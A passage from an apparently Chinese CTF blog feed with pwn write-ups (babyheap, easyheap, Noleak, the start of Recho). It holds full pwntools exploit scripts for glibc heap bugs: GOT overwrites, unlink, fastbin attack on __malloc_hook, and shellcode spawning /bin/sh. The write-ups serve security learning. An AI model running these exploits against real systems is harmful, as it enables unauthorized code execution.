class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">#p = remote(&apos;node3.buuoj.cn&apos;,26569)</span><br><span class="line">offset = 0x3c4b20</span><br><span class="line"></span><br><span class="line">def create(size):</span><br><span class="line">p.sendlineafter(&apos;: &apos;,&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">p.sendlineafter(&apos;: &apos;,&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.sendlineafter(&apos;: &apos;,&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">p.sendlineafter(&apos;: &apos;,&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(0x20)</span><br><span class="line">create(0x20)</span><br><span class="line">create(0x100)</span><br><span class="line">create(0x20)</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x141)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">delete(1)</span><br><span class="line">create(0x130)</span><br><span class="line">payload = &apos;\x00&apos;*0x20+p64(0)+p64(0x111)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">p.recv(0x3a)</span><br><span class="line">libc_main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;))-88</span><br><span class="line">#obj = LibcSearcher(&apos;main_arena&apos;,libc_main_arena)</span><br><span class="line">libc_base = libc_main_arena - offset</span><br><span class="line">shell = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">#print hex(libc_base)</span><br><span class="line">create(0x60)</span><br><span class="line">delete(2)</span><br><span class="line">fake_addr = libc_main_arena-0x33</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x71)+p64(fake_addr)</span><br><span class="line">print payload</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">create(0x60)</span><br><span class="line">create(0x60)</span><br><span class="line">payload = &apos;a&apos;*0x13+p64(shell)</span><br><span class="line">edit(4,len(payload),payload)</span><br><span class="line">create(0x10)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这种题目现在基本只能算作比赛的签到题了，本菜鸡还是不能完整的解出来。心态都要爆炸了。不说了，撸源码去了呜呜呜</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校抗疫-easyheap</title>
      <link href="/2020/03/15/%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB-easyheap/"/>
      <url>/2020/03/15/%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB-easyheap/</url>
      
        <content type="html"><![CDATA[<p>已经很久没有写博客了，这次高校抗疫比赛又一次遭到了社会的毒打。赛后根据大佬的wp对最简单的easyheap这道题进行了复现，对<br>这方面的知识有了更深的认识。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/1.jpg" alt="avatar"><br>首先checksec一下程序发现没开pie，并且可以修改got表，这是一个好的开始<br><img src="/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/2.jpg" alt="avatar"><br>然后ida逆向一下，看到这是一个比较常规的菜单题</p><p><img src="/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/3.jpg" alt="avatar"><br>然后进到create函数里面看一下，程序首先会创建一个大小为0x10的chunk来保存content的相关信息，数据结构大概是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct Node&#123;</span><br><span class="line">char *content;</span><br><span class="line">int size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而当我们输入的size大小大于1024的时候，Node的结构体就不会初始化。这样当我们利用glibc的fastbin先创建一个大小为0x18的chunk然后<br>将其delete后，再去申请一个大小大于1024的chunk，这个未初始化的Node结构体的content正好指向了下一个chunk，同时大小为0x10的堆空间<br>会被作为另一个Node的空间，这样我们就能够利用edit来修改下一个Node的content指针，来达到任意地址写的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create(0x18,&apos;a&apos;*0x18)</span><br><span class="line">delete(0)</span><br><span class="line">createNode()</span><br><span class="line">create(0x18,&apos;b&apos;*0x18)</span><br><span class="line">delete(1)</span><br><span class="line">createNode()</span><br><span class="line">create(0x18,&apos;c&apos;*0x18)</span><br></pre></td></tr></table></figure><p>经过利用后程序的堆空间布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0xca9000</span><br><span class="line">0xca9000:0x00000000000000000x0000000000000021</span><br><span class="line">0xca9010:0x0000000000ca90200x0000000000000018</span><br><span class="line">0xca9020:0x00000000000000000x0000000000000021</span><br><span class="line">0xca9030:0x0000000000ca90400x6161616100000018</span><br><span class="line">0xca9040:0x61616161616161610x0000000000000021</span><br><span class="line">0xca9050:0x0000000000ca90700x6262626200000018</span><br><span class="line">0xca9060:0x62626262626262620x0000000000000021</span><br><span class="line">0xca9070:0x63636363636363630x6363636363636363</span><br><span class="line">0xca9080:0x63636363636363630x0000000000020f81</span><br></pre></td></tr></table></figure><p>接下来我们只需要修改Node2的content指针为free_got，然后对Node2进行edit，我们修改的就是free_got地址的内容了。我们将其修改为<br>puts_plt的地址，然后将再次将Node2的content指针修改为指向puts_got,这样当我们释放chunk2时，就能够泄露出puts_addr了。<br>然后利用同样的方法修改atoi_got为system函数地址，下一次输入”/bin/sh”就能get shell了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./easyheap&apos;)</span><br><span class="line">ptr = 0x6020c0</span><br><span class="line">e = ELF(&apos;./easyheap&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line">free_got = e.got[&apos;free&apos;]</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">atoi_got = e.got[&apos;atoi&apos;]</span><br><span class="line">#max chunksize = 1024 max idx = 3</span><br><span class="line">def create(size,content):</span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;deleted?\n&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;modified?\n&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def createNode():</span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">p.sendline(str(2048))</span><br><span class="line">create(0x18,&apos;a&apos;*0x18)</span><br><span class="line">delete(0)</span><br><span class="line">createNode()</span><br><span class="line"></span><br><span class="line">create(0x18,&apos;b&apos;*0x18)</span><br><span class="line">delete(1)</span><br><span class="line">createNode()</span><br><span class="line">create(0x18,&apos;c&apos;*0x18)</span><br><span class="line">edit(1,0x10*&apos;c&apos;+p64(free_got))</span><br><span class="line">edit(2,p64(puts_plt))</span><br><span class="line"></span><br><span class="line">edit(1,&apos;c&apos;*0x10+p64(puts_got))</span><br><span class="line">delete(2)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">system = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">edit(0,&apos;c&apos;*0x10+p64(atoi_got))</span><br><span class="line">edit(1,p64(system))</span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次复盘对自己的帮助还是很大的，菜归菜，总能积累一些东西下来。还是尽量把libc的源码给好好看看吧，这样对自己做题还是有很大<br>好处的。希望下次比赛可以做出个几道题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Noleak</title>
      <link href="/2020/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Noleak/"/>
      <url>/2020/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Noleak/</url>
      
        <content type="html"><![CDATA[<p>为了搞懂这道题目我真的是使出了自己的毕生所学了，感觉自己学过的知识点已经用上了一大半了，不过这道题是真的很有趣。学习<br>完赶紧来记录一下用到的知识点，也算是重新巩固一下。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/img/noleak/1.jpg" alt="avatar"><br>经过分析发现程序打开了RELRO和canary，因此我们不能修改got表，对栈上的操作也比较困难</p><p><img src="/img/noleak/2.jpg" alt="avatar"><br>这里看到程序逻辑还是很简单的，一个很常见的堆上存取数据的程序</p><p><img src="/img/noleak/3.jpg" alt="avatar"><br><img src="/img/noleak/4.jpg" alt="avatar"><br><img src="/img/noleak/5.jpg" alt="avatar"><br>经过分析我们发现程序有以下功能<br>1.create 这里就是一个创建指定大小的堆空间，并且向其中写入我们的数据的操作，其中我们创建的堆的地址存储在buf里<br>2.edit 这个功能里面我们发现他没有对数据长度进行限制，因此我们就能利用这个漏洞来进行堆溢出，以此构造出unlink来进行<br>任意地址写<br>3.delete  这里程序在free了指定堆后没有将其中内容清除，因此存在一个UAF漏洞</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>经过以上的分析，程序可以利用的漏洞已经基本被我们发现了，所以接下来就是我们如何对漏洞进行利用了<br>由于程序打开了RELRO保护，因此我们不能直接修改got表，同时由于没有输出函数，我们也不能对程序地址进行泄露。但是我们发现<br>这个程序关闭了nx保护，这就为我们执行shellcode提供了可乘之机。这里我们的思路就是将shellcode保存在bss段上，然后想办法<br>让程序执行bss段上的shellcode。</p><p>说到上面的思路，就要介绍一下我最近学的新知识了<br>利用malloc_hook大致就是只要把它赋值为某个函数的地址，当我们再次执行malloc函数的时候，就会调用我们赋值的那个函数<br>因此我们的思路就是把malloc_hook赋值为bss段的地址，这样当我们再次执行malloc时，我们就能够拿到shell</p><p>当然，想要做到对malloc_hook的赋值也不是那么容易的，我们需要做到申请到他的地址，然后往其中赋值。想要做到这一点，我们<br>就需要利用到unsorted bin的攻击以及partial write的相关知识了<br>经过学习我们知道，当我们free一个unsorted大小的堆时，如果这个堆处在unsorted bin的第一个chunk或者最后一个chunk时，其fd和bk都是指向main_arena+88这个地址的<br><img src="/img/noleak/6.jpg" alt="avatar"><br>这里我们看到这个堆的fd和bk都指向了main_arena+88这个位置，同时我们再往上看<br><img src="/img/noleak/7.jpg" alt="avatar"><br>我们发现在main_arena上面就是我们需要的malloc_hook的地址，那如果我们利用uaf漏洞将这个fd修改到malloc_hook<br>之上的一个合适的地址，我们是不是就能利用fastbin attack来申请到地址来修改malloc_hook的值<br>经过学习我们发现在malloc_hook-0x23这个地址上，其结构是这样的<br><img src="/img/noleak/8.jpg" alt="avatar"><br>当我们把这个地址利用漏洞给加进fastbin时，我们再次申请堆的时候，我们就能以0x7f为大小申请出这个堆，这样，我们就能够<br>对malloc_hook进行赋值了，也就能够执行shellcode拿到shell</p><p>这里需要注意程序没有开启pie保护，又由于程序的页载入机制的缺陷，地址的随机是只能够影响到单个内存页的，也就是0x1000大<br>小，因此程序不管加载几次，main_arena和malloc_hook的地址的后三位都是不变的，所以我们其实只需要爆破出地址的第四位就<br>能够实现正确的覆写，而不用泄露出整个地址。这里用到的就是<em>partial wrote</em>技术了。我们已经了解了我们需要将chunk的fd修改<br>为我们malloc_hook-0x23，同时也知道了main_arena+0x88的后三位是B78,malloc_hook的后三位是B10,所以其实只需要将第四<br>位写成一个固定的数，然后多运行几次就能够成功了。</p><p>下面我们看具体的实现过程吧</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先是构造出unlink来实现任意地址写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ptr = 0x601040</span><br><span class="line">create(0x100,&apos;a&apos;*0x100)</span><br><span class="line">create(0x100,&apos;b&apos;*0x100)</span><br><span class="line">payload = p64(0)+p64(0x101)</span><br><span class="line">payload += p64(ptr-0x18)+p64(ptr-0x10)   #fakefd and fakebk</span><br><span class="line">payload += &apos;a&apos;*(0x100-0x20)</span><br><span class="line">paylaod += p64(0x100)+p64(0x110)   #make it believe that prve chunk is free</span><br><span class="line">edit(0,len(payload),payload)  #chunk overflow</span><br><span class="line">delete(1)  #unlink</span><br></pre></td></tr></table></figure><p>当我们执行完这一步之后我们发现buf记录的第一个地址已经变成了0x601028<br><img src="/img/noleak/9.jpg" alt="avatar"><br>之后我们只需要编辑一次堆0就能够实现任意地址写了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x18+p64(0x601020)</span><br><span class="line">edit(0,len(payload),payload)</span><br></pre></td></tr></table></figure><p>接下来我们需要创建一个unsorted bin大小的堆，来实现partial write</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">attack_addr = 0x2000+(malloc_hook_plt&amp;0xfff)-0x23</span><br><span class="line">create(0x10,&apos;c&apos;*0x10)  #chunk2   overwrite chunk&apos;s size</span><br><span class="line">create(0x80,&apos;d&apos;*0x80)  #chunk3   </span><br><span class="line">create(0x65,&apos;e&apos;*0x65)  #chunk4</span><br><span class="line">create(0x65,&apos;f&apos;*0x65)  #chunk5</span><br><span class="line">delete(3)</span><br><span class="line">create(0x80,p16(attack_addr))</span><br></pre></td></tr></table></figure><p>到这一步，我们已经实现了对fd的修改，所以下面我们要考虑的就是如何将这个chunk给放到fastbin这个单向链表中去，这里就<br>能够利用chunk2来进行堆溢出修改chunk3的size域，这样就能够将其放到fastbin中去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;c&apos;*0x10+p64(0)+p64(0x71)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">delete(4)</span><br><span class="line">delete(5)</span><br></pre></td></tr></table></figure><p>这里当我们将chunk4和chunk5都释放之后，我们就发现fastbin已经形成了chunk5-&gt;chunk4的一个单向链表<br>chunk5的结构如下<br><img src="/img/noleak/10.jpg" alt="avatar"><br>那么只要我们将chunk5的fd都最后两个字节覆写为0x30，我们是不是就能创建一个chunk5-&gt;chunk3-&gt;malloc_hook-0x23这样<br>的一条单向链表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(5,1,p8(0x30))</span><br></pre></td></tr></table></figure><p><img src="/img/noleak/11.jpg" alt="avatar"><br>这里当我们爆破正确的时候，链表的最后一个地址指向的应该就是malloc_hook上方的一个地址。那么当我们申请一个合适大小的<br>堆之后，我们就能够申请到这个地址并且对malloc_hook进行赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcode.ljust(0x20,&apos;\x00&apos;)+p64(0)*8  #由于程序限制，最多只能添加10个堆，将原来创建的堆清空</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">create(0x65,&apos;g&apos;*0x65)</span><br><span class="line">create(0x65,&apos;h&apos;*0x65)</span><br><span class="line">payload = &apos;a&apos;*0x13+p64(bss_addr)</span><br><span class="line">create(0x65,payload</span><br></pre></td></tr></table></figure><p><img src="/img/noleak/12.jpg" alt="avatar"><br>我们发现malloc_hook已经被我们成功修改了！<br>之后再执行一次创建操作，我们就能够拿到shell了</p><p>贴上完整的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;)</span><br><span class="line"></span><br><span class="line">e = ELF(&apos;./timu&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line">malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">ptr = 0x601040</span><br><span class="line">bss = 0x601020</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">print len(shellcode)</span><br><span class="line">attack_addr = 0x2000+(malloc_hook&amp;0xfff)-0x23</span><br><span class="line">def create(size,content):</span><br><span class="line">p.recvuntil(&apos;choice :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&apos;Data:&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&apos;choice :&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">p.recvuntil(&apos;choice :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&apos;Data:&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def hack():</span><br><span class="line">create(0x100,&apos;a&apos;*0x100)</span><br><span class="line">create(0x100,&apos;b&apos;*0x100)</span><br><span class="line"></span><br><span class="line">payload = p64(0)+p64(0x101)+p64(ptr-0x18)+p64(ptr-0x10)</span><br><span class="line">payload += &apos;a&apos;*(0x100-0x20)+p64(0x100)+p64(0x110)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x18+p64(bss)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">create(0x10,&apos;c&apos;*0x10)</span><br><span class="line">create(0x80,&apos;d&apos;*0x80)</span><br><span class="line">create(0x65,&apos;e&apos;*0x65)</span><br><span class="line">create(0x65,&apos;f&apos;*0x65)</span><br><span class="line">delete(3)</span><br><span class="line">create(0x80,p16(attack_addr))</span><br><span class="line">payload = &apos;c&apos;*0x10+p64(0)+p64(0x71)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">delete(4)</span><br><span class="line">delete(5)</span><br><span class="line"></span><br><span class="line">edit(5,1,p8(0x30))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload = shellcode.ljust(0x20,&apos;\x00&apos;)</span><br><span class="line">payload += p64(0)*8</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">create(0x65,&apos;g&apos;*0x65)</span><br><span class="line">create(0x65,&apos;h&apos;*0x65)</span><br><span class="line">payload = &apos;a&apos;*0x13+p64(bss)</span><br><span class="line">create(101,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;choice :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">p = process(&apos;./timu&apos;)</span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">print &apos;hack.....&apos;</span><br><span class="line">hack()</span><br><span class="line">break</span><br><span class="line">except:</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说真的，这道题目是真的有趣，把pwn里的很多知识都给融合进去了。这些漏洞单一的一个都是不能帮助我们解出题目的，但是加在<br>一起却能够发生化学反应，这大概就是pwn的魅力吧。虽然肝的我欲仙欲死，但结果还是蛮爽的嘛。乘着假期尽量多刷点题目吧，好好<br>备赛！</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Recho-读取flag文件</title>
      <link href="/2020/02/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Recho-%E8%AF%BB%E5%8F%96flag%E6%96%87%E4%BB%B6/"/>
      <url>/2020/02/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Recho-%E8%AF%BB%E5%8F%96flag%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看啥题都感觉像是神仙打架，真心觉得想要把pwn给学好就要去把那些源码看一遍才好。感觉自己的头发都要保不住了啊啊啊啊。<br>希望出题人轻点吧。。。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/img/Recho/1.jpg" alt="avatar"><br>保护几乎都没有开，一开始以为是一个良好的开始，后面才知道自己想的太简单了。</p><p><img src="/img/Recho/2.jpg" alt="avatar"></p><p>程序的逻辑确实是十分简单，一开始也以为是可以直接通过ROP来解决的，但是发现程序是一只处在循环中的。<br>后来看了大佬的WP才知道pwntools还有shutdown这个函数可以强行停止循环，但这样的话程序也不会再进行第二次运行了。因此直接<br>进行泄漏函数地址这样的操作就是行不通的了。但是我们看到程序中给了我们flag这个字符串，这里有学到了一种新思路，那就是利用<br>syscall来调用open函数，然后将flag给读到我们的bss段中，最后在使用printf函数给打印出来。这个操作真的是骚到我了。</p><p>下面来看一下如何进行具体操作的吧</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>有了上述的思路之后，我们首先要解决的就是syscall的问题<br><img src="/img/Recho/3.jpg" alt="avatar"></p><p>这里我们跟踪一下alarm函数发现在这个函数got表偏移为5的地方就是syscall了，这就是我们所需要程序执行的地方</p><p>因此下面我们所需要做的就是如何来修改alarm_got使得运行alarm函数的时候执行syscall。这就要用到下面的一个gadgets<br><img src="/img/Recho/4.jpg" alt="avatar"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add byte ptr [rdi],al;ret</span><br></pre></td></tr></table></figure><p>这一个gasgets可以让rdi内指向的地址加上al的值，这样到时候我们就可以劫持其GOT表了</p><p>下面我们先进行第一步操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 